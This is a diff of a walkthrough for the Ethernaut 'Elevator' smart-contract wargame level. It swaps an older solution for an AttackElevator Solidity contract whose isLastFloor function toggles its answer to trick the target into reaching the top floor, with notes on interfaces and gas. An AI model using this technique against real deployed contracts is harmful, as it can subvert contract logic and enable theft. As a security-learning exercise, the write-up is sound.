@@ -166,37 +166,28 @@ contract AttackReentrancy {
 ```
 
 ## 11. Elevator
-Actually this one surprised me a little. I knew how to make top true but I didn't know what the problem is until I read further. Apparently, the older version of the solidity compiler does not ensure that view, constant or pure functions modify state. For example, as of 0.4.25, the compiler only prompts an error if your view function modifies state. However, when I tried it with 0.4.17, no prompt is triggered.
+Since `building.isLastFloor()` is not a view function, you could implement it in such a way where it returns a different value everytime it is called, even if it is called in the same function. Moreover, even if it were to be changed to a view function, you could also still [attack it](https://github.com/OpenZeppelin/ethernaut/pull/123#discussion_r317367511).
 
-https://solidity.readthedocs.io/en/develop/contracts.html#view-functions
-https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d
+Note: You don't have to inherit an interface for the sake of doing it. It helps with the abstract constract checks when the contract is being compiled. As you can see in my implementation below, I just needed to implement `isLastFloor()` because at the end of the day, it still gets encoded into a hexidecimal function signature and as long as this particular signature exists in the contract, it will be called with the specified params. 
+
+Sometimes `.call()` gives you a bad estimation of the gas required so you might have to manually configure how much gas you want to send along with your transaction. 
 ```
-pragma solidity ^0.4.18;
+pragma solidity ^0.6.0;
 
-import "./Elevator.sol";
-
-contract SingleFloor is Building {
-    bool private iCheated = false;
-    Elevator private _target;
+contract AttackElevator  {
+    bool public flag; 
     
-    constructor(address target) public { 
-        _target = Elevator(target);
+    function isLastFloor(uint) public returns(bool) {
+        flag = !flag;
+        return !flag;
     }
     
-    function goLastFloor(uint floor) public {
-        _target.goTo(floor);
+    function forceTopFloor(address _victim) public {
+        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
+        _victim.call(payload);
     }
-    
-    function isLastFloor(uint) view public returns (bool) {
-        if(!iCheated) {
-            iCheated = true;
-            return false;
-        }
-        return true;
-    }
+   
 }
-
-
 ```
 
 
